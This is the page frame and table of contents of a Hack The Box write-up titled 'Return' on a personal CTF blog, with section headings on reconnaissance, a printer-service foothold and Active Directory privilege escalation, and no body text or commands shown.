
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="ch3ckm8">
      
      
        <link rel="canonical" href="https://ch3ckm8.github.io/personal_blog4/ch3ckm8_HTB_Return/">
      
      
        <link rel="prev" href="../ch3ckm8_HTB_Nocturnal/">
      
      
        <link rel="next" href="../ch3ckm8_HTB_TheFrizz/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>Return - Ch3ckm8 Vault</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/interactive_graph.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/obsidian_tags.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/custom.css">
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#intro" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="Ch3ckm8 Vault" class="md-header__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Ch3ckm8 Vault
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Return
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href=".." class="md-tabs__link">
        
  
  
    
  
  Welcome

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../ch3ckm8_HTB_Active/" class="md-tabs__link">
          
  
  
  HTB Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-tabs__link">
          
  
  
  Other CTF Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../windows/" class="md-tabs__link">
          
  
  
  Tags

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="Ch3ckm8 Vault" class="md-nav__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    Ch3ckm8 Vault
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Welcome
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    HTB Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            HTB Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Active/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Administrator/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Administrator
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Blackfield/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blackfield
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Cascade/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cascade
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_EscapeTwo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    EscapeTwo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Nocturnal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Nocturnal
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Return
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Return
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#add-target-to-etchosts" class="md-nav__link">
    <span class="md-ellipsis">
      Add target to /etc/hosts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap scan
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Nmap scan">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#webapp-inspection" class="md-nav__link">
    <span class="md-ellipsis">
      WebApp inspection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#connecting-to-the-printer-service" class="md-nav__link">
    <span class="md-ellipsis">
      Connecting to the printer service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-where-we-can-login-with-found-creds" class="md-nav__link">
    <span class="md-ellipsis">
      Checking where we can login with found creds
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LDAP enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bloodhound-as-svc-printer" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound as SVC-PRINTER"
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-membership-of-user-svc-printer" class="md-nav__link">
    <span class="md-ellipsis">
      Group Membership of user svc-printer
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#what-rights-do-server-operators-have" class="md-nav__link">
    <span class="md-ellipsis">
      🧰 What Rights Do Server Operators Have?
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🧰 What Rights Do Server Operators Have?">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dumping-ntdsdit-back-up-and-restore-files" class="md-nav__link">
    <span class="md-ellipsis">
      Dumping NTDS.dit (Back up and restore files)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#services" class="md-nav__link">
    <span class="md-ellipsis">
      Services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#modifying-and-exploiting-the-service" class="md-nav__link">
    <span class="md-ellipsis">
      Modifying and exploiting the service
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_TheFrizz/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    TheFrizz
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_forest/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forest
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_monteverde/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Monteverde
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_sauna/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Sauna
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Timelapse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Timelapse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_cicada/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cicada
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Escape/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Escape
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Flight/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Flight
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_fluffy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Fluffy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_puppy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Puppy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_tombwatcher/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Tombwatcher
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Other CTF Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Other CTF Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RoboGRoot's-Portfolio
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Tags
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Tags
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    windows
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AD/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AD
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADconnectAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADconnectAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AS-REP-roasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AS-REP-roasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../DCSync/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DCSync
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Docker/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Docker
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../GSSAPIauthentication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    GSSAPIauthentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Kerberoasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberoasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../NotAssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NotAssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OSCPpath/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OSCPpath
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PortForwarding/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PortForwarding
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PrivGroupAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PrivGroupAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RCE/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RCE
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RecycleBin/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RecycleBin
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WebApp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WebApp
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WinPEAS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WinPEAS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../XSS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    XSS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificates/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certificates
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntemplate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntemplate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../codereview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    codereview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commandinjection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    commandinjection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gpo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    gpo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    linux
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../history/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    history
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../laps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    LAPS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mssql/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    mssql
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Impersonation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Impersonation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Vhosts/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Vhosts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC16/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC16
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC15/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC15
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../shadowcredential/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    shadowcredential
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADdisabledaccount/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADdisabledaccount
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#add-target-to-etchosts" class="md-nav__link">
    <span class="md-ellipsis">
      Add target to /etc/hosts
    </span>
  </a>
  
